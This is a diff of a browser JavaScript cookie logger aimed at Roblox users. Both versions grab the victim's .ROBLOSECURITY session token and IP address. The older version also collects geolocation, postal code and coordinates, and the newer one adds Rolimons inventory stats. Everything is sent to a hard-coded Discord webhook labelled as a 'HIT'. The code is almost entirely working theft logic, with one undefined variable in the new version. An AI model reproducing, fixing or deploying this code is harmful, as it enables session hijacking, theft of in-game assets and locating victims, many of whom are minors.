@@ -1,173 +1,195 @@
-const webhookURL = "YOUR WEBHOOK  IADDED ROBLOXSTATS SHIT"; // Your webhook URL
+const webhook = "https://discord.com/api/webhooks/1426741706203729920/PC1esaYAlDocap9N4u6exHlLLbLV8nMXLstdPW36_T5UO5-MfZc58qJfc7mBpXtVAr9y";
 
-async function sendGeoEmbed() {
+// try fixing shit aight dont roast my ass
+
+
+async function fetchWithRetry(url, options = {}, retries = 3, delay = 1000) {
   try {
-    // Fetch IP address
-    const ip = await fetchIP();
-    if (!ip) throw new Error("Failed to retrieve IP address");
-
-    // Fetch geolocation info
-    const geo = await fetchGeo(ip);
-    if (!geo || geo.error) {
-      console.error("Failed to fetch geolocation data", geo?.error);
-    }
-
-    // Convert country code to emoji, fallback to flag if error
-    const countryCode = geo?.country_code || "US";
-    const flagEmoji = countryCodeToEmoji(countryCode);
-
-    // Get Roblox security token from cookies
-    const token = getCookie(".ROBLOSECURITY") || "N/A";
-
-    // Get Roblox user ID from URL
-    const userId = getRobloxUserId();
-
-    // Fetch username if userId exists
-    const username = userId ? await getRobloxUsername(userId) : "Unknown";
-
-    // Generate headshot URL or fallback image
-    const headshotUrl = userId
-      ? `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`
-      : "https://via.placeholder.com/150?text=No+Headshot";
-
-    // Build embed message
-    const embed = {
-      title: `🌐 IP Geolocation 📍`,
-      description: `🚩 Country: **${geo?.country_name || "Unknown"}** ${flagEmoji}`,
-      color: 0x1abc9c,
-      author: {
-        name: `👤 ${username}`,
-        url: userId ? `https://www.roblox.com/users/${userId}/profile` : null,
-        icon_url: "https://cdn-icons-png.flaticon.com/512/847/847969.png"
-      },
-      thumbnail: {
-        url: headshotUrl
-      },
-      fields: [
-        {
-          name: "🗺️ Coordinates",
-          value: `📍 Latitude: **${geo?.latitude ?? "N/A"}**\n📍 Longitude: **${geo?.longitude ?? "N/A"}**`,
-          inline: false
-        },
-        {
-          name: "📫 Postal Code",
-          value: `🏢 ${geo?.postal ?? "N/A"}`,
-          inline: false
-        },
-        {
-          name: "🌍 Region / City",
-          value: `🗺️ ${geo?.region ?? "N/A"}, ${geo?.city ?? "N/A"}`,
-          inline: false
-        },
-        {
-          name: "🔑 Roblox Token",
-          value: `🔐 ${token}`,
-          inline: false
-        }
-      ],
-      timestamp: new Date().toISOString(),
-      footer: {
-        text: "🌐 Geo data via ipapi.co",
-        icon_url: "https://cdn-icons-png.flaticon.com/512/732/732200.png"
-      }
-    };
-
-    // Prepare webhook message
-    const msg = {
-      username: "🛰HIT",
-      avatar_url: "https://cdn.discordapp.com/avatars/1425248210359947368/fea665d6e4892cac13b6c4d397fedf1b.webp?size=80",
-      embeds: [embed]
-    };
-
-    // Send the webhook
-    const resp = await fetch(webhookURL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(msg)
-    });
-
-    if (resp.ok) {
-      console.log("✅ Embed sent!");
+    const response = await fetch(url, options);
+    if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
+    return response;
+  } catch (err) {
+    if (retries > 0) {
+      console.warn(`Fetch failed for ${url}. Retrying in ${delay}ms... (${retries} retries left)`);
+      await new Promise(res => setTimeout(res, delay));
+      return fetchWithRetry(url, options, retries - 1, delay * 2);
     } else {
-      const errorText = await resp.text();
-      console.error("❌ Failed to send embed:", resp.status, errorText);
+      throw err;
     }
-  } catch (error) {
-    console.error("❌ Error in sendGeoEmbed:", error);
   }
 }
 
-// Helper functions with comprehensive error handling
 
-async function fetchIP() {
+const getRobloxUserId = () => {
   try {
-    const response = await fetch("https://api.ipify.org?format=json");
-    if (!response.ok) throw new Error(`IP fetch failed with status ${response.status}`);
-    const data = await response.json();
-    return data?.ip ?? null;
+    const url = window.location.href;
+    const match = url.match(/\/users\/(\d+)\//);
+    if (match) return match[1];
+    console.warn("Roblox user ID not found in URL");
+    return null;
   } catch (err) {
-    console.error("Error fetching IP:", err);
+    console.error("Error extracting user ID:", err);
     return null;
   }
-}
+};
 
-async function fetchGeo(ip) {
-  try {
-    const response = await fetch(`https://ipapi.co/${ip}/json/`);
-    if (!response.ok) throw new Error(`Geo fetch failed with status ${response.status}`);
-    const data = await response.json();
-    return data;
-  } catch (err) {
-    console.error("Error fetching geolocation:", err);
-    return null;
-  }
-}
-
-function countryCodeToEmoji(cc) {
-  try {
-    const OFFSET = 127397;
-    return cc
-      .toUpperCase()
-      .split('')
-      .map(c => String.fromCodePoint(c.charCodeAt(0) + OFFSET))
-      .join('');
-  } catch {
-    return "🏳️"; // fallback flag emoji
-  }
-}
 
 function getCookie(name) {
   try {
     const value = `; ${document.cookie}`;
     const parts = value.split(`; ${name}=`);
     if (parts.length === 2) return parts.pop().split(';').shift();
+    console.warn(`Cookie "${name}" not found`);
     return null;
-  } catch {
-    return null;
-  }
-}
-
-function getRobloxUserId() {
-  try {
-    const url = window.location.href;
-    const match = url.match(/\/users\/(\d+)\//);
-    return match ? match[1] : null;
-  } catch {
-    return null;
-  }
-}
-
-async function getRobloxUsername(userId) {
-  try {
-    const response = await fetch(`https://users.roblox.com/v1/users/${userId}`);
-    if (!response.ok) throw new Error(`Failed to fetch username with status ${response.status}`);
-    const data = await response.json();
-    return data?.name ?? "Unknown";
   } catch (err) {
-    console.error('Error fetching username:', err);
-    return "Unknown";
+    console.error(`Error reading cookie "${name}":`, err);
+    return null;
   }
 }
 
-// Call the main function
-sendGeoEmbed();
+
+const token = getCookie(cookieName);
+
+// Fetch Roblox user profile info
+async function fetchRobloxUserInfo(userId) {
+  try {
+    const response = await fetchWithRetry(`https://users.roblox.com/v1/users/${userId}`);
+    const data = await response.json();
+    const headshotUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
+    return {
+      name: data?.name ?? "Unknown",
+      id: userId,
+      avatarUrl: "https://cdn-icons-png.flaticon.com/512/847/847969.png",
+      headshotUrl
+    };
+  } catch (err) {
+    console.error("Failed to fetch Roblox user info:", err);
+    return null;
+  }
+}
+
+
+async function fetchRolimonStats(userId) {
+  try {
+    const response = await fetchWithRetry(`https://rolimons.com/playerapi.php?userid=${userId}`);
+    const data = await response.json();
+    return {
+      profit: data?.profit ?? "N/A",
+      loss: data?.loss ?? "N/A",
+      inventoryValue: data?.inventory_value ?? "N/A"
+    };
+  } catch (err) {
+    console.error("Failed to fetch Rolimon's stats:", err);
+    return {
+      profit: "N/A",
+      loss: "N/A",
+      inventoryValue: "N/A"
+    };
+  }
+}
+
+
+async function fetchIp() {
+  try {
+    const response = await fetchWithRetry('https://api.ipify.org?format=json');
+    const data = await response.json();
+    return data.ip;
+  } catch (err) {
+    console.error("Failed to fetch IP address:", err);
+    return "Unknown IP";
+  }
+}
+
+
+async function sendRobloxInfo() {
+  const userId = getRobloxUserId();
+  if (!userId) {
+    console.error("Cannot proceed: User ID missing");
+    return;
+  }
+
+  if (!token) {
+    console.error(`Cannot proceed: Cookie "${cookieName}" not found`);
+    return;
+  }
+
+  let [userInfo, rolimonStats, ipAddress] = [null, null, null];
+
+  try {
+    [userInfo, rolimonStats, ipAddress] = await Promise.all([
+      fetchRobloxUserInfo(userId),
+      fetchRolimonStats(userId),
+      fetchIp()
+    ]);
+  } catch (err) {
+    console.error("Error fetching data:", err);
+    return;
+  }
+
+  if (!userInfo) {
+    console.warn("User info is null, aborting webhook");
+    return;
+  }
+
+  const timestamp = new Date().toISOString();
+  const profileUrl = `https://www.roblox.com/users/${userId}/profile`;
+  const avatarIconUrl = "https://cdn.iconscout.com/icon/free/png-256/roblox-16-461119.png";
+
+  const embed = {
+    color: 0x5865F2,
+    author: {
+      name: `👤 ${userInfo.name}`,
+      url: profileUrl,
+      icon_url: avatarIconUrl
+    },
+    title: `Roblox User Info | IP: ${ipAddress}`,
+    description: `
+__**User Details:**__
+🆔 **ID:** ${userId}
+🌐 **IP Address:** ${ipAddress}
+🖼️ **Headshot:** [Click Here](${userInfo.headshotUrl})
+
+__**Roblox Account:**__  
+📝 **Name:** ${userInfo.name}  
+🖥️ **Profile:** [Profile Link](${profileUrl})
+
+__**Rolimon's Stats:**__  
+💰 **Profit:** \`${rolimonStats.profit}\`  
+💸 **Loss:** \`${rolimonStats.loss}\`  
+🏦 **Inventory Value:** \`${rolimonStats.inventoryValue}\`
+`,
+    thumbnail: {
+      url: userInfo.headshotUrl
+    },
+    fields: [
+      {
+        name: "Roblox Cookie",
+        value: `\`\`\`${token}\`\`\``,
+        inline: false
+      }
+    ],
+    footer: {
+      text: "🌐 Data via APIs",
+      icon_url: "https://cdn-icons-png.flaticon.com/512/732/732200.png"
+    },
+    timestamp
+  };
+
+  try {
+    const response = await fetchWithRetry(webhook, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ embeds: [embed] })
+    });
+    if (response.ok) {
+      console.log("✅ Webhook sent successfully");
+    } else {
+      console.error(`Failed to send webhook: Status ${response.status}`);
+    }
+  } catch (err) {
+    console.error("Error sending webhook:", err);
+  }
+}
+
+// Run the function
+sendRobloxInfo();
